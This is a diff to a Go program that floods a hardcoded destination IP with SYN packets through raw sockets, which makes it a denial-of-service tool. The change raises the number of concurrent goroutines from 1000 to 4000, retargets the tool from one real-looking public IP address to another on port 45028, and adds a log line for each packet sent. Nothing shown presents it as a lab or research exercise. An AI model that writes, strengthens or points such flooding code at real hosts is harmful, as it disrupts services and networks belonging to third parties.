@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"log"
 	"syscall"
 	"time"
@@ -9,13 +10,13 @@ import (
 )
 
 // Number of goroutines
-var numGoroutines = 1000
+var numGoroutines = 4000
 
 // Destination IP address
-var destIP = net.ParseIP("108.171.216.122").To4()
+var destIP = net.ParseIP("193.46.26.78").To4()
 
 // Destination port
-var destPort = 80
+var destPort = 45028
 
 func sendPacket() {
 	// Create a raw socket
@@ -62,6 +63,7 @@ func sendPacket() {
 		}); err != nil {
 			log.Fatal(err)
 		}
+		fmt.Println("SYN packet sent to", destIP.String())
 		time.Sleep(1 * time.Second)
 	}
 }
